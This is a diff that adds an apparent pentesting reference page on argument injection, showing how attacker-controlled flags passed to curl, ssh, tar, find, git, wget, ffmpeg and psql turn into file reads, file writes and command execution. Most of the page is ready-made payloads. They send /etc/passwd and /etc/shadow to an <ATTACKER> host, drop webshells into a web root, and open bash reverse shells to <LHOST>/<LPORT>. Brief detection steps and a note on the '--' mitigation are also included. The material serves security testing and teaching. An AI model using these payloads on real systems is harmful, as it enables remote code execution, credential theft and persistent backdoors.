@@ -1,0 +1,250 @@
+---
+title: Argument injection
+description: Exploiting fixed binaries with attacker-controlled arguments - curl, ssh, tar, find, git, ImageMagick, and other high-yield targets.
+mitre: [T1190, T1059]
+d3fend: [D3-MH, D3-PSA, D3-EI]
+impact: [RCE, FileRead, FileWrite]
+owasp: [A05]
+sidebar:
+  order: 7
+  label: Argument injection
+---
+import { Aside, Tabs, TabItem, Steps } from '@astrojs/starlight/components';
+
+## TL;DR
+
+The application calls a fixed binary safely (no shell, no concatenation), but you control one or more arguments. You can't add new commands, but you can add new *flags* to the existing command - and many CLIs have flags that read files, write files, fetch URLs, or execute code.
+
+```bash
+# curl: read local file via -o, send via --upload-file, fetch URL of choice
+;curl <ATTACKER>/exfil --upload-file /etc/passwd
+
+# ssh: -o ProxyCommand executes arbitrary command
+ssh -o ProxyCommand="bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'" x
+
+# tar: --checkpoint-action=exec= runs arbitrary command
+tar -cf /tmp/x.tar --checkpoint=1 --checkpoint-action=exec=id /tmp/anything
+
+# find: -exec runs arbitrary command per match
+find /tmp -exec id {} \;
+```
+
+Success indicator: the original binary executes, but with a side effect from your injected flag (file read, callback, RCE).
+
+## Why this is its own bug class
+
+Command injection requires concatenation into a shell. Argument injection happens when the developer was *trying* to be safe:
+
+```python
+# Developer-thinks-this-is-safe pattern
+subprocess.run(['curl', user_input])           # no shell=True, no concatenation
+```
+
+```php
+// Same trap, PHP
+escapeshellarg($url);                          // escapes shell metachars
+$cmd = "curl " . escapeshellarg($url);
+system($cmd);
+```
+
+Neither is exploitable to command injection - there's no separator that survives. But if `user_input` starts with `-`, it's a *flag*, not a URL. `curl --output /tmp/x http://evil/payload` writes a file. `curl -K /etc/passwd` reads a config file. The binary is doing exactly what it's told.
+
+The bug is in the developer's mental model: "I sanitized for shell, so it's safe." Argument injection is the bug class that breaks that assumption.
+
+## How to find it
+
+<Steps>
+
+1. **Identify the binary.** Application calls `curl`, `ssh`, `git`, `tar`, `convert`, `ffmpeg`, `wget`, `find`, `mv`, `cp`, `gzip`, `zip`, `unzip`, `gpg`, `openssl`, `mysql`, `psql`, `pg_dump`, `mysqldump`, `nmap`, `ping`, `traceroute`, `nslookup`, `dig`. Anything where one parameter feeds into argv.
+
+2. **Send a value starting with `-`.** A URL, hostname, filename, or path that begins with `-` will be parsed as a flag. If the response changes (error, different output, unexpected file appears), the value reaches argv unchanged.
+
+3. **Find the right flag.** Read the man page. Look for flags that: write files (`-o`, `--output`), read files (`-K`, `--config`, `-T`, `--upload-file`), execute commands (`-e`, `--exec`, `--use-compress-program`), or load network resources.
+
+4. **Confirm via side effect.** OOB callback (`curl <ATTACKER>`) or file write (`-o /tmp/canary`) - same techniques as blind cmdi.
+
+</Steps>
+
+<Aside type="tip">
+The single best filter to bypass when looking for argument injection: a leading `-`. Many naive validators check for shell metacharacters but allow `-` because hyphens appear in URLs, hostnames, and filenames. `--config /etc/passwd` is alphanumeric plus dash plus slash - and reads `/etc/passwd` as a curl config file.
+</Aside>
+
+## High-value targets
+
+### curl
+
+The most common target. Many features, many of them dangerous when an attacker picks the URL.
+
+| Flag | Effect | Payload |
+| --- | --- | --- |
+| `-o <FILE>` | Write to local file | `-o /var/www/html/shell.php http://<ATTACKER>/shell.php` |
+| `-O` | Write to filename from URL | `-O http://<ATTACKER>/anything` |
+| `-K <FILE>` | Load config file (parses local file as curl config) | `-K /etc/passwd` |
+| `-T <FILE>` | Upload local file via PUT | `-T /etc/passwd http://<ATTACKER>/` |
+| `--upload-file <FILE>` | Same as `-T` | `--upload-file /etc/shadow http://<ATTACKER>/` |
+| `--data-binary @<FILE>` | Send local file as POST body | `--data-binary @/etc/passwd http://<ATTACKER>/` |
+| `--proto-default file` | Force `file://` protocol | (with `-o /tmp/x` extracts files) |
+
+Example exploitation when the application runs `curl <user-input>`:
+
+```bash
+# Exfil /etc/passwd via PUT to your listener
+--upload-file /etc/passwd http://<ATTACKER>/p
+```
+
+```bash
+# Drop a webshell in the docroot
+-o /var/www/html/s.php http://<ATTACKER>/s.php
+```
+
+```bash
+# Read a local file by abusing config parser
+-K /etc/passwd
+# Exits with parse errors that include file content in error messages
+```
+
+### ssh
+
+`-o` accepts arbitrary OpenSSH config directives, including ones that execute commands.
+
+| Directive | Effect |
+| --- | --- |
+| `ProxyCommand` | Runs the command before connecting; arbitrary RCE |
+| `LocalCommand` (with `PermitLocalCommand=yes`) | Runs after auth |
+
+Payload when application runs `ssh <user-input>`:
+
+```bash
+-o ProxyCommand="bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'" anyhost
+```
+
+The `anyhost` argument is required (ssh demands a target); the ProxyCommand fires before any connection attempt, so the host doesn't need to exist.
+
+### tar
+
+`--checkpoint-action=exec=` runs an arbitrary command after each checkpoint.
+
+```bash
+--checkpoint=1 --checkpoint-action=exec=id /tmp/decoy
+```
+
+Requires that you can pass at least one path-like argument (`/tmp/decoy`). Some tar versions also require a mode flag (`-cf /dev/null`):
+
+```bash
+-cf /dev/null --checkpoint=1 --checkpoint-action=exec="bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'" /tmp/decoy
+```
+
+### find
+
+The classic. `-exec` runs a command per match.
+
+```bash
+. -exec id \;
+. -exec bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' \;
+```
+
+The `\;` terminates the `-exec`. URL-encode as `%5C%3B` if the application URL-decodes once.
+
+### git
+
+Git's hooks and config can execute commands during innocuous operations.
+
+```bash
+# git clone with --upload-pack runs the value as a command on `git ls-remote` / `git fetch`
+clone --upload-pack="bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'" 'ssh://x/x'
+```
+
+The CVE-2017-1000117 family (`ssh://`-URL with `-oProxyCommand`) was patched but variants still surface. Worth testing.
+
+### ImageMagick (`convert`, `magick`)
+
+Historically catastrophic (ImageTragick / CVE-2016-3714). Modern versions sandbox most issues, but check anyway:
+
+```bash
+# Old MVG/MSL/HTTPS coder bugs - patched but worth probing
+'http://<ATTACKER>/x.png|id'
+'msl:/tmp/exploit.msl'
+```
+
+If the application runs `convert <user-input> output.png`, an input filename starting with `|` triggered shell exec on old versions.
+
+### ffmpeg
+
+```bash
+# HLS playlist with file:// - read local files
+-i 'file:///etc/passwd' -c copy /tmp/x.txt
+```
+
+If you control input, ffmpeg's protocol parser opens files, http, concat lists. Various CVEs in this space.
+
+### wget
+
+```bash
+-O /var/www/html/s.php http://<ATTACKER>/s.php
+--use-askpass=/usr/bin/id                       # CVE-2024 family - runs the askpass binary
+```
+
+### gzip / zip / unzip / 7z
+
+```bash
+# zip with --unzip-command (rare)
+# 7z with @listfile reads file content as filename list
+```
+
+These are situational; the binaries are less commonly invoked from web apps.
+
+### mysql / psql / mysqldump / pg_dump
+
+```bash
+# psql -c reads a command - RCE if you control the -c value
+-c '\! id'                                      # \! shells out in psql
+```
+
+The `\!` meta-command in psql runs shell commands. mysql client's `--init-command` plus `-e` are similar.
+
+### Less obvious targets
+
+- **`mv`, `cp`** - `--target-directory=`, `--reflink` flags can be abused in race conditions
+- **`gpg`** - `--use-agent`, `--exec-path` - load attacker-controlled binaries
+- **`openssl`** - `enc -in <FILE>` reads files; useful for exfil through error messages
+
+## Detection methodology
+
+<Steps>
+
+1. **Send `--help` or `--version`.** If the response changes to look like CLI help text, you're hitting argv directly. Almost certain argument injection.
+
+2. **Send a value with leading `-`.** If the application errors with "unknown option," your value is being parsed as a flag.
+
+3. **Send `--config /etc/passwd` or `-K /etc/passwd`.** For curl/wget specifically. Errors that quote file contents = file read primitive.
+
+4. **Send `--output /tmp/canary`.** If `/tmp/canary` appears (read it via another endpoint or via cmdi if you also have it), you have file write.
+
+5. **Send `--exec id` or `-exec id \;`.** For find/tar. Look for `uid=` in any output channel.
+
+</Steps>
+
+## Argument-vs-command separator (`--`)
+
+Many binaries treat `--` as "end of flags; everything after is positional." Defenders sometimes inject `--` before user input as a fix:
+
+```bash
+curl -- <user-input>            # user-input cannot start with - now
+```
+
+This *does* mitigate argument injection for that specific call. But many binaries don't honor `--`, and many call sites forget it. Test for whether `--` is present by sending `--help` and seeing whether help text appears (no `--` injected) or the literal `--help` is treated as a URL/filename (`--` injected upstream).
+
+## Common failure modes
+
+- **Value does start with `-` but doesn't reach argv.** Application strips leading `-`, or wraps in quotes that survive argv splitting. Test by sending `-` alone and looking for behavior change.
+- **Binary doesn't have the flag you want.** Check the *exact* version. `curl --upload-file` exists in modern versions; older builds may lack it. `man curl` on a similar system to see what's available.
+- **Flag exists but binary refuses to run with it.** Some flags require config (`PermitLocalCommand=yes` for ssh's `LocalCommand`). Use a flag that doesn't need server-side cooperation.
+- **Output is suppressed.** You hit RCE via `find -exec id` but `id`'s output goes to a black hole. Wrap with OOB: `-exec curl <ATTACKER>/$(id) \;`.
+- **Multiple arguments needed for the exploit.** Application provides only one user-controlled slot. You need to fit the whole exploit into one argv element. Quote-wrapped flags (`-o/tmp/x`, no space) sometimes work; flags with `=` (`--output=/tmp/x`) usually do.
+- **`--` end-of-flags marker present.** Application calls `binary -- <input>`. Argument injection mitigated for this slot. Look for other slots, or different binary.
+
+## Notes
+
+Argument injection is underrepresented in references - it sits in a gap where command-injection scanners don't trigger (no shell metacharacters) and parameter-validation tools don't trigger (input is alphanumeric plus `-`). Real-world frequency is higher than the literature suggests, especially in CI/CD systems, file processing pipelines, and admin panels that wrap CLI tools. When you see an application invoking a CLI binary, always test for argument injection before assuming the developer's `escapeshellarg`/`shell=False` defense holds.
+
+The technique scales: every additional CLI binary in the application's invocation graph is another potential argument-injection surface. A dashboard that renders Markdown via `pandoc`, generates PDFs via `wkhtmltopdf`, archives logs via `tar`, and pushes backups via `rsync` has four argument-injection candidates, each with its own flag vocabulary.
